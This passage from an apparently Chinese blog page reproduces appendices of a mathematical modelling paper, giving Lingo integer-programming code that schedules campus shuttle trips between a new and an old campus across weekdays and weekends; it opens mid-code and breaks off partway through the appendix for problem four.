new_school(i,j)&gt;=target_new(j)  );  @for(oldweek(i,j):    old_school(i,j)&gt;=target_old(j)  );  !对于新校区;  @for(days(i):    @for(new(j):      @for(uo(n)|(old_time(n)+1)#le#new_time(j) #and#  new_time(j)#lt#(old_time(n+1)+1):      (20-old_init_num(i))+@sum(old(k)|k#le#n:old_school(i,k))-@sum(new(k)|k#lt#j:new_school(i,k))&gt;=new_school(i,j)      )    )  );  !对于老校区;  @for(days(i):    @for(old(j)|j#ge#3:      @for(un(n)|(new_time(n)+1)#le#old_time(j) #and#  old_time(j)#lt#(new_time(n+1)+1):      old_init_num(i)+@sum(new(s)|s#le#n:new_school(i,s))-@sum(old(s)|s#lt#j:old_school(i,s))&gt;=old_school(i,j)      )    )  );  @for(dayso(i):old_init_num(i+1)=old_init_num(i)        -@sum(old(j):old_school(i,j))        +@sum(new(j):new_school(i,j))  );  @for(newweek(i,j):    @gin(new_school(i,j))  );  @for(oldweek(i,j):    @gin(old_school(i,j))  );</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h6 id="附录四-问题三Lingo代码"><a href="#附录四-问题三Lingo代码" class="headerlink" title="附录四  : 问题三Lingo代码"></a>附录四  : 问题三Lingo代码</h6><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">MODEL:</span><br><span class="line">!定义集合;</span><br><span class="line">SETS:</span><br><span class="line">new/<span class="number">1.</span><span class="number">.12</span>/:new_time,target_new;</span><br><span class="line">old/<span class="number">1.</span><span class="number">.14</span>/:old_time,target_old;</span><br><span class="line">sat_new/<span class="number">1.</span><span class="number">.6</span>/:new_sat_time,target_new_sat,new_school_sat;</span><br><span class="line">sat_old/<span class="number">1.</span><span class="number">.6</span>/:old_sat_time,target_old_sat,old_school_sat;</span><br><span class="line">sun_new/<span class="number">1.</span><span class="number">.6</span>/:new_sun_time,target_new_sun,new_school_sun;</span><br><span class="line">sun_old/<span class="number">1.</span><span class="number">.6</span>/:old_sun_time,target_old_sun,old_school_sun;</span><br><span class="line">un/<span class="number">1.</span><span class="number">.11</span>/;</span><br><span class="line">uo/<span class="number">1.</span><span class="number">.13</span>/;</span><br><span class="line">un_weekend/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">uo_weekend/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">initial/<span class="number">1.</span><span class="number">.7</span>/:old_init_num;</span><br><span class="line">days/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">dayso/<span class="number">1.</span><span class="number">.4</span>/;</span><br><span class="line">sat/<span class="number">1</span>/;</span><br><span class="line">sun/<span class="number">1</span>/;</span><br><span class="line">newweek(days,new):new_school;</span><br><span class="line">oldweek(days,old):old_school;</span><br><span class="line">ENDSETS</span><br><span class="line">DATA:</span><br><span class="line">new_time=<span class="number">9</span>,<span class="number">10.5</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22.5</span>;</span><br><span class="line">old_time=<span class="number">7</span>,<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">14.8333</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">17.8333</span>,<span class="number">21</span>,<span class="number">22.5</span>;</span><br><span class="line">new_sat_time=<span class="number">9</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">21</span>;</span><br><span class="line">old_sat_time=<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">20</span>;</span><br><span class="line">new_sun_time=<span class="number">9</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">21</span>;</span><br><span class="line">old_sun_time=<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">20</span>;</span><br><span class="line">target_new=<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">8</span>, <span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line">target_old=<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line">target_new_sat=<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line">target_old_sat=<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>;</span><br><span class="line">target_new_sun=<span class="number">2</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>;</span><br><span class="line">target_old_sun=<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;newfive&#x27;</span>)=new_school;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;oldfive&#x27;</span>)=old_school;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;oii&#x27;</span>)=old_init_num;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;newsix&#x27;</span>)=new_school_sat;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;oldsix&#x27;</span>)=old_school_sat;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;newsev&#x27;</span>)=new_school_sun;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\86183\Desktop\output3.xlsx&#x27;</span>,<span class="string">&#x27;oldsev&#x27;</span>)=old_school_sun;</span><br><span class="line">ENDDATA</span><br><span class="line"><span class="built_in">min</span>=@sum(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):(new_school(<span class="built_in">i</span>,<span class="built_in">j</span>)-target_new(<span class="built_in">j</span>)))+@sum(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):(old_school(<span class="built_in">i</span>,<span class="built_in">j</span>)-target_old(<span class="built_in">j</span>))) + </span><br><span class="line">@sum(sat_new(<span class="built_in">i</span>):(new_school_sat(<span class="built_in">i</span>)-target_new_sat(<span class="built_in">i</span>))) + @sum(sat_old(<span class="built_in">i</span>):(old_school_sat(<span class="built_in">i</span>)-target_old_sat(<span class="built_in">i</span>)))+</span><br><span class="line">@sum(sun_new(<span class="built_in">i</span>):(new_school_sun(<span class="built_in">i</span>)-target_new_sun(<span class="built_in">i</span>))) + @sum(sun_old(<span class="built_in">i</span>):(old_school_sun(<span class="built_in">i</span>)-target_old_sun(<span class="built_in">i</span>)))</span><br><span class="line">;</span><br><span class="line">@for(initial(i)|i#le#5:</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school(<span class="built_in">i</span>,<span class="number">1</span>)+old_school(<span class="built_in">i</span>,<span class="number">2</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@for(initial(i)|i#eq#6:</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school_sat(<span class="number">1</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@for(initial(i)|i#eq#7:</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school_sun(<span class="number">1</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">new_school(<span class="built_in">i</span>,<span class="built_in">j</span>)&gt;=target_new(<span class="built_in">j</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">old_school(<span class="built_in">i</span>,<span class="built_in">j</span>)&gt;=target_old(<span class="built_in">j</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">new_school_sat(<span class="built_in">i</span>)&gt;=target_new_sat(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_old(<span class="built_in">i</span>) :</span><br><span class="line">old_school_sat(<span class="built_in">i</span>)&gt;=target_old_sat(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">new_school_sun(<span class="built_in">i</span>)&gt;=target_new_sun(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_old(<span class="built_in">i</span>) :</span><br><span class="line">old_school_sun(<span class="built_in">i</span>)&gt;=target_old_sun(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">!对于新校区;</span><br><span class="line">@<span class="keyword">for</span>(days(<span class="built_in">i</span>):</span><br><span class="line">@<span class="keyword">for</span>(new(<span class="built_in">j</span>):</span><br><span class="line">@for(uo(n)|(old_time(n)+1)#le#new_time(j) #and# new_time(j)#lt#(old_time(n+1)+1):</span><br><span class="line">(20-old_init_num(i))+@sum(old(k)|k#le#n:old_school(i,k))-@sum(new(k)|k#lt#j:new_school(i,k))&gt;=new_school(i,j)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">@for(uo_weekend(j)|(old_sat_time(j)+1)#le#new_sat_time(i) #and# new_sat_time(i) #lt#(old_sat_time(j+1)+1):</span><br><span class="line">(20-old_init_num(6))+@sum(sat_old(k)|k#le#j:old_school_sat(k))-@sum(sat_new(k)|k #lt#i:new_school_sat(k))&gt;=new_school_sat(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">@for(uo_weekend(j)|(old_sun_time(j)+1)#le#new_sun_time(i) #and# new_sun_time(i) #lt#(old_sun_time(j+1)+1):</span><br><span class="line">(20-old_init_num(7))+@sum(sun_old(k)|k#le#j:old_school_sun(k))-@sum(sun_new(k)|k #lt#i:new_school_sun(k))&gt;=new_school_sun(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">!对于老校区;</span><br><span class="line">@<span class="keyword">for</span>(days(<span class="built_in">i</span>):</span><br><span class="line">@for(old(j)|j#ge#3:</span><br><span class="line">@for(un(n)|(new_time(n)+1)#le#old_time(j) #and# old_time(j)#lt#(new_time(n+1)+1):</span><br><span class="line">old_init_num(i)+@sum(new(s)|s#le#n:new_school(i,s))-@sum(old(s)|s#lt#j:old_school(i,s))&gt;=old_school(i,j)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@for(sat_old(i)|i#ge#2:</span><br><span class="line">@for(un_weekend(j)|(new_sat_time(j)+1)#le#old_sat_time(i) #and# old_sat_time(i)#lt#(new_sat_time(j+1)+1):</span><br><span class="line">old_init_num(6)+(@sum(sat_new(k)|k#le#j:new_school_sat(k))-@sum(sat_old(k)|k#lt#i:old_school_sat(k)))&gt;=old_school_sat(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@for(sun_old(i)|i#ge#2:</span><br><span class="line">@for(un_weekend(j)|(new_sun_time(j)+1)#le#old_sun_time(i) #and# old_sun_time(i)#lt#(new_sun_time(j+1)+1):</span><br><span class="line">old_init_num(7)+(@sum(sun_new(k)|k#le#j:new_school_sun(k))-@sum(sun_old(k)|k#lt#i:old_school_sun(k)))&gt;=old_school_sun(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(dayso(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">1</span>)=old_init_num(<span class="built_in">i</span>)</span><br><span class="line">-@sum(old(<span class="built_in">j</span>):old_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">+@sum(new(<span class="built_in">j</span>):new_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">5</span>)=old_init_num(<span class="number">5</span>)</span><br><span class="line">-@sum(old(<span class="built_in">j</span>):old_school(<span class="number">5</span>,<span class="built_in">j</span>))</span><br><span class="line">+@sum(new(<span class="built_in">j</span>):new_school(<span class="number">5</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">6</span>)=old_init_num(<span class="number">6</span>)</span><br><span class="line">-@sum(sat_old(<span class="built_in">j</span>):old_school_sat(<span class="built_in">j</span>))</span><br><span class="line">+@sum(sat_new(<span class="built_in">j</span>):new_school_sat(<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">@gin(new_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">@gin(old_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">@gin(new_school_sat(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_old(<span class="built_in">i</span>):</span><br><span class="line">@gin(old_school_sat(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">@gin(new_school_sun(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_old(<span class="built_in">i</span>):</span><br><span class="line">@gin(old_school_sun(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="附录五-问题四Lingo代码"><a href="#附录五-问题四Lingo代码" class="headerlink" title="附录五  : 问题四Lingo代码"></a>附录五  : 问题四Lingo代码</h6><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">MODEL:</span><br><span class="line">!定义集合;</span><br><span class="line">SETS:</span><br><span class="line">new/<span class="number">1.</span><span class="number">.12</span>/:new_time,target_new;</span><br><span class="line">old/<span class="number">1.</span><span class="number">.14</span>/:old_time,target_old;</span><br><span class="line">sat_new/<span class="number">1.</span><span class="number">.6</span>/:new_sat_time,target_new_sat,new_school_sat;</span><br><span class="line">sat_old/<span class="number">1.</span><span class="number">.6</span>/:old_sat_time,target_old_sat,old_school_sat;</span><br><span class="line">sun_new/<span class="number">1.</span><span class="number">.6</span>/:new_sun_time,target_new_sun,new_school_sun;</span><br><span class="line">sun_old/<span class="number">1.</span><span class="number">.6</span>/:old_sun_time,target_old_sun,old_school_sun;</span><br><span class="line">un/<span class="number">1.</span><span class="number">.11</span>/;</span><br><span class="line">uo/<span class="number">1.</span><span class="number">.13</span>/;</span><br><span class="line">un_weekend/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">uo_weekend/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">initial/<span class="number">1.</span><span class="number">.8</span>/:old_init_num;</span><br><span class="line">days/<span class="number">1.</span><span class="number">.5</span>/;</span><br><span class="line">dayso/<span class="number">1.</span><span class="number">.4</span>/;</span><br><span class="line">sat/<span class="number">1</span>/;</span><br><span class="line">sun/<span class="number">1</span>/;</span><br><span class="line">mon/<span class="number">1</span>/;</span><br><span class="line">newweek(days,new):new_school;</span><br><span class="line">oldweek(days,old):old_school;</span><br><span class="line">ENDSETS</span><br><span class="line">DATA:</span><br><span class="line">new_time=<span class="number">9</span>,<span class="number">10.5</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22.5</span>;</span><br><span class="line">old_time=<span class="number">7</span>,<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">14.8333</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">17.8333</span>,<span class="number">21</span>,<span class="number">22.5</span>;</span><br><span class="line">new_sat_time=<span class="number">9</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">21</span>;</span><br><span class="line">old_sat_time=<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">20</span>;</span><br><span class="line">new_sun_time=<span class="number">9</span>,<span class="number">11</span>,<span class="number">12.5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">21</span>;</span><br><span class="line">old_sun_time=<span class="number">8</span>,<span class="number">9.3333</span>,<span class="number">12.8333</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">20</span>;</span><br><span class="line">target_new=<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">8</span>, <span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line">target_old=<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line">target_new_sat=<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line">target_old_sat=<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>;</span><br><span class="line">target_new_sun=<span class="number">2</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>;</span><br><span class="line">target_old_sun=<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;newfive&#x27;</span>)=new_school;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;oldfive&#x27;</span>)=old_school;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;oii&#x27;</span>)=old_init_num;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;newsix&#x27;</span>)=new_school_sat;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;oldsix&#x27;</span>)=old_school_sat;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;newsev&#x27;</span>)=new_school_sun;</span><br><span class="line">@ole(<span class="string">&#x27;C:\Users\Liloker\Desktop\output4.xlsx&#x27;</span>,<span class="string">&#x27;oldsev&#x27;</span>)=old_school_sun;</span><br><span class="line">ENDDATA</span><br><span class="line"><span class="built_in">min</span>=@sum(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):(new_school(<span class="built_in">i</span>,<span class="built_in">j</span>)-target_new(<span class="built_in">j</span>)))+@sum(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):(old_school(<span class="built_in">i</span>,<span class="built_in">j</span>)-target_old(<span class="built_in">j</span>))) + </span><br><span class="line">@sum(sat_new(<span class="built_in">i</span>):(new_school_sat(<span class="built_in">i</span>)-target_new_sat(<span class="built_in">i</span>))) + @sum(sat_old(<span class="built_in">i</span>):(old_school_sat(<span class="built_in">i</span>)-target_old_sat(<span class="built_in">i</span>)))+</span><br><span class="line">@sum(sun_new(<span class="built_in">i</span>):(new_school_sun(<span class="built_in">i</span>)-target_new_sun(<span class="built_in">i</span>))) + @sum(sun_old(<span class="built_in">i</span>):(old_school_sun(<span class="built_in">i</span>)-target_old_sun(<span class="built_in">i</span>)))</span><br><span class="line">;</span><br><span class="line">@for(initial(i)|i#le#5:</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school(<span class="built_in">i</span>,<span class="number">1</span>)+old_school(<span class="built_in">i</span>,<span class="number">2</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@for(initial(i)|i#eq#6:</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school_sat(<span class="number">1</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@for(initial(i)|i#eq#7:</span><br><span 